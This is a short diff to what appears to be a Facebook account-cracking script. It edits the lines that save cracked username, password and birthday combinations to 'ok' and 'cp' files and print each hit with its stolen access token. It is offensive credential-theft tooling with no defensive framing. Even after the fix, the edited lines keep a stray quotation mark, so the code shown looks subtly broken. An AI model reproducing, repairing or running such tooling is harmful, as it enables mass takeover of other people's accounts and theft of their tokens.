@@ -147,12 +147,12 @@ class crack:
 			if "session_key" in send or "EAAA" in send:
 				ok+=1
 				ttl = data['birthday'].replace("/","-")
-				open('ok','a').write(user+'|'+pw+'|'ttl')
+				open('ok','a').write(user+'|'+pw+'|'+ttl')
 				print(f'\r\33[32;1m* --> [OK] {user}|{pw}|{ttl}|{send["access_token"]}\33[37;1m                     ',end='')
 				break
 			elif "www.facebook.com" in send["error_msg"]:
 				cp+=1
-				open('cp','a').write(user+'|'+pw+'|'ttl')
+				open('cp','a').write(user+'|'+pw+'|'+ttl')
 				print(f'\r\33[1;33m* --> [CP] {user}|{pw}|{ttl}\33[37;1m                      ',end='')
 				break
 				
